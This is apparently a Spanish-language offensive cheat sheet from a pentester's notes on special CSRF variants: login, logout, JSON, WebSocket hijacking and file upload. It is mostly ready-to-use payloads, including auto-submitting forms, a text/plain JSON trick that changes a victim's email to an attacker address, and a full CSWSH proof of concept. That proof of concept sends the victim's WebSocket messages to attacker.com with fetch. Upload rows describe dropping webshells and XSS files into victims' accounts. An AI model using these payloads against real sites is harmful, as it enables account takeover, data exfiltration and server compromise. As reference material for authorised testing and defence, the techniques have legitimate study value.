---
aliases:
  - Login CSRF
  - Logout CSRF
  - JSON CSRF
  - CSWSH
  - WebSocket CSRF
tags:
  - type/cheatsheet
  - vuln/csrf
  - technique/initial-access
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Cross-Site Request Forgery (CSRF)]]'
---
# CSRF - Tipos Especiales

***

## Login CSRF

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Atacante fuerza victim a hacer **login con creds del atacante**. Victim navega como si fuera el atacante → su actividad guardada en cuenta del atacante. | Privacy/data leak vector. |
| PoC clásico | `<form action="https://target/login" method="POST"><input name="user" value="attacker"><input name="pass" value="atkpass"></form><script>document.forms[0].submit()</script>` | Auto-login. |
| Result post-login | Victim usa cuenta atacante sin notar (UI igual) | Search history, locations, payments → todos en cuenta atacante. |
| Chain con OAuth | Login CSRF + OAuth flow → atacante recibe tokens víctima | OAuth misuse. |
| Chain con account merge | Si app permite merge cuentas — atacante obtiene datos victim | Trick post-login. |
| Mitigation evasion | Mismo bypass tokens / SameSite | Aplican técnicas estándar. |
| Common targets | Servicios con personal data (search, gmail-style) | Privacy critical. |
| Login para session fixation | Login forzado + cookie predecible → atacante hijack la session después | Combo session fixation. |
| Save card / payment chain | Victim agrega tarjeta a cuenta atacante por error | Financial impact. |
| Pre-OAuth confused deputy | OAuth state param missing → confused identity | OAuth-specific CSRF. |
^csrf-special-login

___

## Logout CSRF

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Forzar logout del usuario — denial-of-service de UX. | Annoyance attack. |
| PoC GET-based | `<img src="https://target/logout">` | Si logout es GET. |
| PoC POST-based | Form auto-submit a `/logout` | Si POST. |
| Combine con phishing | Logout + redirect a página phishing pidiendo re-login | Credential theft. |
| Mass logout | Loop de iframes con logouts en multiple servicios | Combine attack. |
| Defense bypass | Mismas técnicas que CSRF normal | No special. |
| Annoyance per session | Cada session reset cuesta tiempo al user | Productivity attack. |
| Combine con session fixation | Logout victim + atacante set new cookie | Session fixation chain. |
^csrf-special-logout

___

## JSON CSRF

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | API espera `Content-Type: application/json`. Browser fetch con JSON body → preflight CORS → bloqueado por defaul. Bypass = forzar Content-Type permitido sin preflight. | Modern APIs. |
| Bypass via text/plain | `<form enctype="text/plain"><input name='{"key":"val","_":' value='_"}'></form>` | Form genera body que parsea como JSON. |
| Bypass via formdata | Si backend acepta multipart como JSON | Edge case parser. |
| Bypass via Flash legacy | Adobe Flash permitía CORS abuse cross-domain | Histórico — Flash dead. |
| Bypass via XHR + simple Content-Type | XHR con `application/x-www-form-urlencoded` y body JSON-formatted | Si server acepta multiple. |
| Bypass via fetch keepalive | Sin preflight si simple request | Combinar con permitted Content-Type. |
| Bypass via server-side JSONP | Si endpoint tiene callback JSONP → atacante pone callback con body | JSONP CSRF. |
| Bypass via CORS misconfig | `Access-Control-Allow-Origin: *` con `Allow-Credentials: true` | Server permite cross-origin con cookies. |
| GraphQL POST CSRF | `Content-Type: application/x-www-form-urlencoded` con `query=...` | GraphQL server-laxos. |
| API REST con array body | Backend tolera `[{...}]` instead of `{...}` | Tolerance widens vector. |
^csrf-special-json

### JSON CSRF via text/plain trick (revisitada)

```html
<form action="https://api.target.com/v1/profile" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

Body literal enviado: `{"email":"attacker@evil.com","x":"=" }`. Server parsea JSON con tolerancia → email actualizado.

___

## WebSocket CSRF (CSWSH)

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | WebSocket handshake = HTTP request con cookies. No tiene Same-Origin Policy nativa — atacante puede abrir WS al target desde su site. | Cross-Site WebSocket Hijacking. |
| PoC básico | `var ws = new WebSocket('wss://target.com/socket'); ws.onopen = () => ws.send('...');` | Cookies enviadas en handshake. |
| Setup defender check | Backend valida `Origin` header en handshake | Defensa estándar. |
| Bypass null Origin | Sandboxed iframe (`<iframe sandbox>`) → Origin: null | Si null aceptado → bypass. |
| Bypass file:// | Origin desde file:// pages | Edge case. |
| Steal mensajes WebSocket | `ws.onmessage = (e) => fetch('//attacker/?d='+e.data)` | Exfiltrar streamed data. |
| Hijack control channel | Send commands via WS impersonando user | Control de conexión. |
| Combine con XSS | XSS embeds CSWSH PoC | Chain. |
| WS protocol negotiation abuse | `Sec-WebSocket-Protocol` con valores raros | Edge case. |
| Origin header forging via iframe | Multi-window scenarios | Complejo. |
| WS subprotocol auth abuse | Auth en subprotocol cookie-less | Specific to design. |
^csrf-special-websocket

### CSWSH PoC

```html
<!DOCTYPE html>
<html>
<body>
<script>
  const ws = new WebSocket('wss://target.com/chat');
  ws.onopen = () => {
    ws.send(JSON.stringify({type:'send_message', to:'all', text:'pwned'}));
  };
  ws.onmessage = (event) => {
    fetch('https://attacker.com/log?d=' + encodeURIComponent(event.data));
  };
</script>
</body>
</html>
```

Atacante hostea esto. Victim visita → WS handshake con cookies → atacante envía mensajes / lee chat de victim.

___

## File Upload CSRF

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Forzar victim a subir archivo controlado por atacante. Multipart form-data NO requiere preflight CORS. | Vector silencioso. |
| PoC clásico | `<form action="..." method="POST" enctype="multipart/form-data"><input type="file" name="upload"></form>` | User no ve archivo seleccionado — pero submit auto. |
| Bypass user interaction | `new File([...], 'evil.php', {type:'application/x-php'})` + FormData + fetch | JS construye file sin input. |
| FormData fetch | `const fd = new FormData(); fd.append('file', new Blob([content]), 'evil.txt'); fetch('//target/upload', {method:'POST', credentials:'include', body:fd})` | Sin preflight. |
| Combine con upload XSS | Subir archivo HTML con XSS → almacenado en cuenta victim | Persistent XSS via CSRF. |
| Combine con webshell drop | Subir PHP/JSP a victim's account dir | Si app guarda en path predictable. |
| Profile picture replacement | Cambiar avatar a imagen ofensiva | Annoyance + reputation. |
| GDPR / data corruption | Subir basura a cuenta victim | Compliance violation. |
| Replace document | App con docs colaborativos — replace user file | Data integrity. |
| Combine con SSRF en upload | Si backend procesa imagen → SSRF vía SVG / SVG inception | Stack chain. |
^csrf-special-upload

***
